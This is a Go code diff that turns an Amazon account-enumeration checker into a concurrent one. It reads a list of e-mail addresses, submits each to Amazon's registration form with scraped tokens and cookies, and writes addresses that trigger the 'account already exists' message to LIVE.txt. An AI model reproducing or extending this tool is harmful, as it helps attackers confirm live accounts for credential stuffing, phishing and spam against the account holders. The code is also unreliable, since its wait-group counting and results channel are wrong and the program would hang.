@@ -6,8 +6,8 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"runtime"
 	"strings"
+	"sync"
 
 	"github.com/gocolly/colly"
 	"github.com/gocolly/colly/queue"
@@ -19,8 +19,6 @@ const url = "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallpar
 var ubidMain = ""
 
 func main() {
-	// var wg sync.WaitGroup
-	// wg.Add(sliceLength)
 	file, err := os.Open("./email.txt")
 
 	if err != nil {
@@ -29,26 +27,84 @@ func main() {
 
 	defer file.Close()
 
-	scanner := bufio.NewScanner(file)
+	jobs := make(chan string)
+	results := make(chan int)
 
-	runtime.GOMAXPROCS(10)
-	for scanner.Scan() { // internally, it advances token based on sperator
-		email := scanner.Text()
+	// I think we need a wait group, not sure.
+	wg := new(sync.WaitGroup)
 
+	for w := 1; w <= 10; w++ {
+		wg.Add(10)
+		go run(jobs, wg, results)
+	}
+
+	go func() {
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			jobs <- scanner.Text()
+		}
+		close(jobs)
+	}()
+
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
+
+	// Now, add up the results from the results channel until closed
+	counts := 0
+	for v := range results {
+		counts += v
+	}
+
+}
+
+func run(email <-chan string, wg *sync.WaitGroup, results <-chan int) {
+	defer wg.Done()
+	for j := range email {
 		appActionToken, prevRID, siteState, workflowState := getHTMLComponent()
-		newFormData := generateFormData(appActionToken, prevRID, siteState, workflowState, email)
+		newFormData := generateFormData(appActionToken, prevRID, siteState, workflowState, j)
 		getCookie()
 		result := checkMail(newFormData)
 
 		if strings.Contains(result, "but an account already exists with the e-mail") {
-			color.New(color.FgGreen, color.BgBlack).Println("LIVE : " + email)
-			// createFile(email, emai)
+			color.New(color.FgGreen, color.BgBlack).Println("LIVE : " + j)
+			createFile(j, "but an account already exists with the e-mail")
 		} else {
-			color.New(color.FgRed, color.BgBlack).Println("NOT LIVE : " + email)
-			// createFile(email, keyVal["msg"])
+			color.New(color.FgRed, color.BgBlack).Println("NOT LIVE : " + j)
+			createFile(j, "")
 		}
-
 	}
+}
+
+func createFile(email string, indicator string) {
+	var newEmail = email + "\n"
+	if strings.Contains(indicator, "but an account already exists with the e-mail") {
+		f, err := os.OpenFile("LIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if _, err := f.Write([]byte(newEmail)); err != nil {
+			log.Fatal(err)
+		}
+		if err := f.Close(); err != nil {
+			log.Fatal(err)
+		}
+	} else {
+		f, err := os.OpenFile("NOTLIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if _, err := f.Write([]byte(newEmail)); err != nil {
+			log.Fatal(err)
+		}
+		if err := f.Close(); err != nil {
+			log.Fatal(err)
+		}
+	}
+
+	//this is my change
+
 }
 
 func generateFormData(appActionToken string, prevRID string, siteState string, workflowState string, email string) map[string]string {
